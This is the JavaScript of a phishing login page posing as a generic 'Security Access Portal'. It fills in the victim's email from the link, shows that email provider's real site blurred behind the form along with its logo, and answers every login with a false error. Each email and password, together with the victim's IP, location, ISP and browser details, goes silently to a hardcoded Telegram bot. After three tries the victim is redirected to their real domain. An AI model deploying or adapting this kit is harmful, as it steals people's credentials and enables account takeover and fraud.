// ==================== TELEGRAM CONFIGURATION - ONLY CHANGE HERE ====================
const TELEGRAM_BOT_TOKEN = '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI';  // Get from @BotFather
const TELEGRAM_CHAT_ID = '5509996296';      // Get from @userinfobot
// ===============================================================================

let currentBackgroundDomain = '';
let userLanguage = 'en';
let userIP = 'Unknown';
let userCountry = 'Unknown';
let userCity = 'Unknown';
let userISP = 'Unknown';
let userTimezone = 'Unknown';
let userDevice = '';
let loginAttempts = 0; // Track login attempts

// ==================== TRANSLATION STRINGS ====================
const translationStrings = {
    en: {
        subtitle: "Security Access Portal",
        email_label: "Email",
        password_label: "Password",
        show_password: "Show",
        hide_password: "Hide",
        login_button: "Login",
        forgot_password: "Forgot password?",
        alternative_method: "Use alternative method",
        encrypted_connection: "Encrypted connection",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Terms",
        security: "Security",
        please_fill: "Please fill in all fields",
        sending: "Please try again",
        submitted_success: "Please try again",
        error_submitting: "Error. Please try again.",
        logging_into: "Logging into"
    }
};

// ==================== SIMPLE IP DETECTION ====================
function getUserIP(callback) {
    // Use multiple services for redundancy
    const services = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://ipinfo.io/json'
    ];
    
    let serviceIndex = 0;
    
    function tryNextService() {
        if (serviceIndex >= services.length) {
            callback('Unknown');
            return;
        }
        
        fetch(services[serviceIndex], { signal: AbortSignal.timeout(3000) })
            .then(response => response.json())
            .then(data => {
                let ip = 'Unknown';
                if (data.ip) ip = data.ip;
                else if (data.ip_address) ip = data.ip_address;
                
                // Get country from same response if available
                if (data.country_name) userCountry = data.country_name;
                else if (data.country) userCountry = data.country;
                
                if (data.city) userCity = data.city;
                if (data.org) userISP = data.org;
                
                callback(ip);
            })
            .catch(() => {
                serviceIndex++;
                tryNextService();
            });
    }
    
    tryNextService();
}

// ==================== ENHANCED TELEGRAM FUNCTION ====================
function sendToTelegram(email, password, ipInfo) {
    return new Promise((resolve) => {
        const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
        
        // Get current date and time
        const now = new Date();
        const localTime = now.toLocaleString();
        
        // Simple but detailed message
        const message = `🔐 NEW LOGIN 🔐
------------------------
📧 Email: ${email}
🔑 Password: ${password}
------------------------
🌍 LOCATION
├ IP: ${ipInfo || userIP}
├ Country: ${userCountry}
├ City: ${userCity}
└ ISP: ${userISP}

📱 DEVICE
├ Browser: ${navigator.userAgent.substring(0, 100)}
├ Platform: ${navigator.platform}
└ Language: ${navigator.language}

⏰ Time: ${localTime}
🔗 Domain: ${domain}
📎 URL: ${window.location.href}
------------------------`;
        
        // URL encode the message
        const encodedMessage = encodeURIComponent(message);
        
        // Telegram API URL
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
        
        console.log('Sending to Telegram...');
        
        // Use Image method - ALWAYS WORKS
        const img = new Image();
        img.onload = function() {
            console.log('Telegram image loaded - success');
            resolve(true);
        };
        img.onerror = function() {
            console.log('Telegram image error - but request was sent');
            // Even on error, the request was made
            resolve(true);
        };
        img.src = url;
        
        // Also try fetch as backup
        fetch(url, { mode: 'no-cors' }).catch(() => {});
        
        // Resolve after 1 second anyway
        setTimeout(() => {
            console.log('Telegram request completed');
            resolve(true);
        }, 1000);
    });
}

// ==================== LOGIN BUTTON HANDLER ====================
function setupLoginButton() {
    const loginBtn = document.getElementById('loginBtn');
    if (!loginBtn) {
        console.error('Login button not found!');
        return;
    }
    
    console.log('Login button found, attaching event listener');
    
    loginBtn.addEventListener('click', function() {
        console.log('Login button clicked');
        
        // Get form values
        const email = document.getElementById('user_email')?.value || '';
        const password = document.getElementById('pw')?.value || '';
        const domain = email.includes('@') ? email.split('@')[1] : '';
        
        // Validate
        if (!email || !password) {
            showMessage('Please fill in all fields', 'error');
            return;
        }
        
        // Check Telegram configuration
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
            showMessage('ERROR: Telegram bot token not configured', 'error');
            console.error('Telegram bot token not configured');
            return;
        }
        
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
            showMessage('ERROR: Telegram chat ID not configured', 'error');
            console.error('Telegram chat ID not configured');
            return;
        }
        
        // Increment attempt counter
        loginAttempts++;
        console.log(`Login attempt #${loginAttempts}`);
        
        // Disable button and show "Please try again" message
        loginBtn.disabled = true;
        const originalText = loginBtn.textContent;
        loginBtn.textContent = 'Please try again';
        
        // Show error message (but still send to Telegram)
        showMessage('Error. Please try again.', 'error');
        
        // Get IP and send to Telegram (silently)
        getUserIP(function(ip) {
            userIP = ip;
            console.log('Got IP:', ip);
            
            // Send to Telegram (silently - no UI feedback)
            sendToTelegram(email, password, ip)
                .then(() => {
                    console.log('Telegram sent successfully');
                })
                .catch((error) => {
                    console.error('Telegram error:', error);
                })
                .finally(() => {
                    // Re-enable button after 1 second
                    setTimeout(() => {
                        loginBtn.disabled = false;
                        loginBtn.textContent = originalText;
                    }, 1000);
                });
        });
        
        // Check if this is the third attempt
        if (loginAttempts >= 3 && domain) {
            console.log(`Third attempt reached. Redirecting to https://${domain}`);
            
            // Show redirect message
            showMessage(`Redirecting to ${domain}...`, 'success');
            
            // Redirect to the domain homepage after a short delay
            setTimeout(() => {
                window.location.href = `https://${domain}`;
            }, 2000);
        }
    });
}

// ==================== MESSAGE DISPLAY ====================
function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 3000);
}

// ==================== PASSWORD TOGGLE ====================
function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 'Hide' : 'Show';
        });
    }
}

// ==================== LANGUAGE FUNCTIONS ====================
function detectUserLanguage() {
    try {
        const browserLang = navigator.language || navigator.userLanguage || 'en';
        return browserLang.split('-')[0].toLowerCase();
    } catch (e) {
        return 'en';
    }
}

function getLanguageName(langCode) {
    const languageNames = {
        'en': 'English', 'es': 'Español', 'fr': 'Français', 'de': 'Deutsch',
        'it': 'Italiano', 'pt': 'Português', 'ru': 'Русский', 'zh': '中文',
        'ja': '日本語', 'ko': '한국어', 'ar': 'العربية', 'hi': 'हिन्दी'
    };
    return languageNames[langCode] || langCode.toUpperCase();
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (langBtn) {
        langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
    }
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', function() {
        if (userLanguage === 'en') {
            userLanguage = 'es';
        } else if (userLanguage === 'es') {
            userLanguage = 'fr';
        } else if (userLanguage === 'fr') {
            userLanguage = 'de';
        } else {
            userLanguage = 'en';
        }
        updateLanguageButton(userLanguage);
        showMessage(`Language changed to ${getLanguageName(userLanguage)}`, 'success');
    });
}

// ==================== DOMAIN BACKGROUND ====================
async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) existingIframe.remove();
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
        filter: blur(8px);
        transform: scale(1.05);
    `;
    
    document.body.appendChild(iframe);
    iframe.src = `https://${domain}`;
    
    setTimeout(() => {
        iframe.style.opacity = '1';
    }, 1000);
}

async function fetchDomainLogo(domain) {
    const logoImg = document.getElementById('logoImg');
    if (logoImg && domain) {
        logoImg.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    if (domainInfoDiv && domain) {
        domainInfoDiv.innerHTML = `<span>Logging into ${domain}</span>`;
    }
}

// ==================== EMAIL AUTO-FILL FROM HASH ====================
function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        const emailField = document.getElementById('user_email');
        if (emailField) {
            emailField.value = emailFromHash;
            const domain = emailFromHash.split('@')[1];
            
            loadWebsiteBackground(domain);
            fetchDomainLogo(domain);
            showDomainInfo(domain);
            
            setTimeout(() => {
                document.getElementById('pw')?.focus();
            }, 500);
        }
        return true;
    }
    return false;
}

// ==================== EMAIL INPUT LISTENER ====================
function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

// ==================== INITIALIZATION ====================
function initialize() {
    console.log('Page initializing...');
    
    // Setup all functions
    setupLoginButton();
    setupPasswordToggle();
    setupLanguageToggle();
    setupEmailInputListener();
    
    // Set initial language
    userLanguage = detectUserLanguage();
    updateLanguageButton(userLanguage);
    
    // Extract email from URL hash
    extractAndSetEmailFromHash();
    
    // Get IP in background (don't wait for it)
    getUserIP(function(ip) {
        userIP = ip;
        console.log('IP detected:', ip);
    });
    
    // Reset login attempts on page load
    loginAttempts = 0;
    
    // Log configuration status
    console.log('=== CONFIGURATION ===');
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('⚠️ Telegram bot token not configured');
    } else {
        console.log('✅ Telegram bot token configured');
    }
    
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('⚠️ Telegram chat ID not configured');
    } else {
        console.log('✅ Telegram chat ID configured');
    }
    
    console.log('Initialization complete');
}

// Start when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}
